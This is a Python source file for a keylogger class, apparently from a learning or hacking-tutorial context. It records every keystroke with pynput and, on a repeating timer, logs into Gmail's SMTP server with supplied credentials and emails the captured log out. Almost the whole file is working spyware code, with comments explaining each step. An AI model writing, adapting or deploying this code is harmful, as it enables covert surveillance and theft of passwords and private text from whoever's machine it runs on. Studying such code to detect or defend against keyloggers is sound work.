#!usr/bin/env python

import pynput.keyboard
#Class to monitor keyboard
import threading
import smtplib

log = ""

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        #Function to add current monitored key to the key that is pressed before
        self.log += string
    
    def process_key_press(self, key):
        #Function to record and save the key that is pressed
        try:
            current_key = str(key.char)
            #to make the key pressed as (for example: 'keypress')
            #without .char, the key pressed will be (for example: u'k' u'e' u'y' u'p' u'r' u'e' u's' u's')
            self.append_to_log(str(key.char))
        except AttributeError:
            if key == key.space:
                #if the key pressed is a space key, then the output will return a space ' ' instead of Key.space
                current_key = log + " "
            else:
                #if the key is a sign or a tap, or backspace... it return key.tap, key.backspace ...
                current_key = log + " " + str(key) + " "
            self.append_to_log(str(current_key))

    def report(self):
        #Function to send the key logged to an email
        #Run in the background
        #Don't interrupt the program (key logging)
        #Every X second, send report
        print(self.log)
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_email(self, email, password, message):
        #Function to access/login the email/gmail server
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        #Function to start the program
        keyboard_listener = pynput.keyboard.Listener(on_press= self.process_key_press)
        #An instance of a Listener object to the pynput.keyboard to make a call back function everytime a key is press
        with keyboard_listener:
            #start keyboard_listener
            self.report()
            keyboard_listener.join()
            #.join is to add the current key being monitor with older key monitored




